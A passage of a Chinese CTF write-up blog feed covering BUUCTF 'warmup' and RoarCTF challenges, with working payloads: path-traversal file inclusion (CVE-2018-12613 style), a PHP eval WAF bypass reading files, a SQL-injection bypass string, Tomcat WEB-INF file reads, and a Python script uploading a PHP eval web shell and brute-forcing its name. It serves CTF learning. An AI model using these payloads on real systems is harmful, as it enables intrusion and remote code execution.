punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> </code></pre><p>先不看check函数，我们可以看到关键的源码中，首先请求了file这个变量，并判断这个变量是否是字符串，之后调用checkfile函数，如果返回true，就包含这个文件。</p><p>关键函数checkfile ,着重看这个函数，在一个数组内定义了白名单，只能包含source.php和hint.php。</p><p>判断page是否存在，是否为字符串，之后判断page是否在白名单中，在就返回true.</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>在这段，判断_page是否在白名单中 ，__page为page变量中第一个？前面的内容</p><p><strong>mb_strops()</strong>返回目标字符串在待查找字符串首次出现的位置。这里面的变量&amp;page.’?’是php中的字符串拼接</p><p><strong>mb_substr</strong>截取指定长度的字符串，一般参数mb_substr(str,start,length)</p><p>合起来就是截取page变量中第一个？前面的部分。</p><p>下面对_page 进行了url解密，仍然对page进行如上两个函数操作，返回_page变量？前的内容，如果_page在白名单中，返回true,否则输出you can’t see it</p><p>在源码中，看到了hint.php，查看</p><img src="/2019/10/24/buuctf-warmup/1.PNG"><p>看到真实flag位置，根据源码，构造</p><pre><code>file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>这样构造就会得到flag，目录至少要穿越四层，才能回到根目录。</p><p>大佬的博客说这是个cve2018-12613漏洞，在source.php后面的问号进行了两次url加密，所以大佬给的payload为</p><pre><code>file=source.php%253f/../../../../../../ffffllllaaaagggg</code></pre><p>区别就在于url编码的地方，不明白的是为啥这样更够实现目录穿越。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Roarctf部分wp</title>
      <link href="/2019/10/20/roarctf-bu-fen-wp/"/>
      <url>/2019/10/20/roarctf-bu-fen-wp/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="easy-cacl"><a href="#easy-cacl" class="headerlink" title="easy cacl"></a>easy cacl</h5><p>查看源代码发现了calc.php</p><img src="/2019/10/20/roarctf-bu-fen-wp/11.png"><pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</code></pre><p>用了WAF</p><p>先访问calc.php，发现关键代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>通过GET方式获得num变量，然后进行url加密后通过val()函数</p><p>测试发现计算框除了数字啥也不能输入，直接通过calc.php传值，绕过WAF</p><p><strong>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$POST。例如：/?foo=bar变成Array([foo]=&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/%20news[id%00=42会转换为Array([news_id]=&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截</strong>。</p><p><strong>那么我们就可以用以下语句绕过：</strong></p><pre><code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code></pre><p>可以看这篇文章</p><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>最简单的绕过就是加上空格</p><pre><code>/calc.php? num=phpinfo()</code></pre><img src="/2019/10/20/roarctf-bu-fen-wp/12.png"><p>下面就是绕过题目的黑名单，题目将单双引号都过滤了，空格也过滤了</p><pre class=" language-php"><code class="language-php"><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>大佬wp说存在命令执行函数过滤，但是菜鸡的我没有找到</p><pre class=" language-php"><code class="language-php">passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>chroot<span class="token punctuation">,</span>chgrp<span class="token punctuation">,</span>chown<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>proc_get_status<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>ini_alter<span class="token punctuation">,</span>ini_restore<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>openlog<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>readlink<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>popepassthru<span class="token punctuation">,</span>stream_socket_server<span class="token punctuation">,</span>chdir<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_get_handler<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>opendir<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>mail<span class="token punctuation">,</span>imap_mail<span class="token punctuation">,</span>ini_set<span class="token punctuation">,</span>apache_setenv<span class="token punctuation">,</span>link</code></pre><p>下面读取文件目录</p><p>构造scandir(‘/‘)，首先构造/</p><pre class=" language-php"><code class="language-php">php <span class="token operator">></span> <span class="token keyword">echo</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">47</span></code></pre><p>再构造</p><pre class=" language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string">'scandir'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">61693386291</span></code></pre><p>结果为：</p><p>base_convert(‘61693386291’,10,36)(hex2bin(dechex(47)))</p><pre class=" language-php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">61693386291</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/2019/10/20/roarctf-bu-fen-wp/13.png"><p>看到flagg文件，读取内容readfile()</p><pre class=" language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">2146934604002</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">52115961636711</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>还可以用另一个函数file_get_contents()</p><pre><code>php &gt; echo hexdec(bin2hex(&#39;/f1agg&#39;));52115961636711</code></pre><p>最终playload</p><pre class=" language-pjp"><code class="language-pjp">file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><p>函数base_convert(转换字符，原进制，转换进制)</p><p>hexdec(bin2hex（”字符串“）)字符串转为hex –&gt;10进制</p><p>hex2bin(dechex(数字))  10进制转hex–&gt;字符串</p><hr><h5 id="easy-java"><a href="#easy-java" class="headerlink" title="easy java"></a>easy java</h5><img src="/2019/10/20/roarctf-bu-fen-wp/14.png"><p>出现登录框，以为是注入，注了半天也没有结果，偶然的爆破竟然登陆成功</p><pre><code>admin888</code></pre><img src="/2019/10/20/roarctf-bu-fen-wp/15.png"><p>但是登进去也没啥用，只有张图片的绝对路径</p><p>回想到有个help，get 请求失败，可以尝试post，发现可以读取文件，实现文件的任意读取</p><p>但是读取什么文件呢？</p><img src="/2019/10/20/roarctf-bu-fen-wp/16.png"><p>访问一个错误的文件，从报错信息发现，Apache Tomcat </p><img src="/2019/10/20/roarctf-bu-fen-wp/17.png"><p><strong>补充</strong></p><p>Apache Tomcat 是一款 Java Servlet 和 JavaServer Pages 技术的开源软件实现，可以作为测试 Servlet 的独立服务器，而且可以集成到 Apache Web 服务器</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件</p><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层</p><p>WEB-INF是Java的WEB应用的安全目录，是不可以通过URL直接访问到这个目录下的资源的；不过可以做一个业务逻辑处理，例如<code>servlet</code>，接收到请求的参数后可以跳转到想要的界面；</p><p>如果想要在页面中访问其中的文件，必须通过web.xml文件对要访问的文件进行相应的映射才能访问；WEB-INF文件夹下还存在classes文件夹，里面放置了<code>*.class</code>文件</p><p>Java Servlet部署：</p><p>如果有一个类名称<code>com.wm.ctf.FlagController</code>，那么这个Servlet类必须位于<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code>中；之后需要在web.xml中创建下列格式的条目：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.wm.ctf.FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/Flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span></code></pre><p>访问/WEB-INF/web.xml,发现了FlagController</p><img src="/2019/10/20/roarctf-bu-fen-wp/18.png"><p>推测下面的路径，<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/2019/10/20/roarctf-bu-fen-wp/19.png"><p>找到base64编码，解码得到flag</p><h5 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple upload"></a>simple upload</h5><p>题目的源码已经给出</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 实例化上传类</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传大小</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传类型</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传目录</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传子目录</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传错误提示错误信息</span>          <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传成功 获取上传文件信息</span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><p>说是上传，但是找不到上传点，在链接后面随便输入index.php/ssss,发现了thInkphp报错，版本为3.24</p><p>在网上找到对应版本，找到它的上传Upload.class.php</p><img src="/2019/10/20/roarctf-bu-fen-wp/20.png"><p>可以看到这个类中定义了exts为上传的类型。那么代码中的为不会生效的</p><pre><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型</code></pre><p>找到上传的upload方法</p><img src="/2019/10/20/roarctf-bu-fen-wp/1.jpg"><p>可以看到，如果upload()中不带参数的话，其会对$_FILES,进行检测和上传，也就是说可以同时上传多个文件（只要表单name 不为file即可），从而绕过检测）：</p><pre><code>$uploadFile = $_FILES[&#39;file&#39;] ;if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {    return false;}</code></pre><p>上传路径我们是知道的，但是文件名会被处理，可以看到<code>Upload.class.php</code>中定义的属性中，<code>savaName</code>为其默认的命名规则，主要利用了<code>uniqid()</code>函数：</p><img src="/2019/10/20/roarctf-bu-fen-wp/21.png"><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><img src="/2019/10/20/roarctf-bu-fen-wp/23.png"><p>可以看到，同时上传文件时，其文件名相差很小，只有后2~3位，那么同时上传两个文件，根据第一个文件名爆破出第二个即可。exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment" spellcheck="true"># thinkphp默认路由为pathinfo路径形式 → http://网址/index.php/分组/控制器/操作方法</span>url<span class="token operator">=</span><span class="token string">"http://f8c2d615-93ac-4a78-9634-85dda2d38c2e.node3.buuoj.cn/index.php/home/index/upload"</span>files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'files'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>file<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> itertools<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepname<span class="token operator">=</span><span class="token string">'5dbe438e0f'</span>url <span class="token operator">=</span> <span class="token string">'http://c9e017fe-a16e-446b-b9bd-c8018f548c5a.node3.buuoj.cn/Public/Uploads/2019-11-03/'</span>dic <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>dic<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>    u <span class="token operator">=</span> url <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>    <span class="token comment" spellcheck="true">#print(u)</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(s.status_code)</span>    <span class="token keyword">if</span> s<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>访问成功，得到flag</p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h5><p>视频很短，播放一遍后发现存在二维码一闪而过，用暴风影音一帧一帧卡出四张二维码。</p><img src="/2019/10/20/roarctf-bu-fen-wp/1.PNG"><img src="/2019/10/20/roarctf-bu-fen-wp/2.PNG"><img src="/2019/10/20/roarctf-bu-fen-wp/3.PNG"><img src="/2019/10/20/roarctf-bu-fen-wp/4.PNG"><p>用微信扫出的结果为iwantplayctf</p><p>伤心的是，这是个压缩包的密码，它藏在文件后面，有一串base64加密的字符串</p><pre class=" language-str"><code class="language-str">UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD.Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf.JkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA==</code></pre><p>，用脚本还原并转为hex,用hxd打开，保存为rar文件。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64str1<span class="token operator">=</span><span class="token string">'UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD.Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf.JkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA=='</span>flag1<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>flag2<span class="token operator">=</span>flag1<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span> flag2</code></pre><p>得到了rar文件,输入密码得到flag.txt</p><p>roarctf{CTF-from-RuMen-to-RuYuan}</p><h5 id="坦克游戏"><a href="#坦克游戏" class="headerlink" title="坦克游戏"></a>坦克游戏</h5><p>直接将文件Assembly-CSharp.dll放在dnSpy中，发现了Wingame函数</p><img 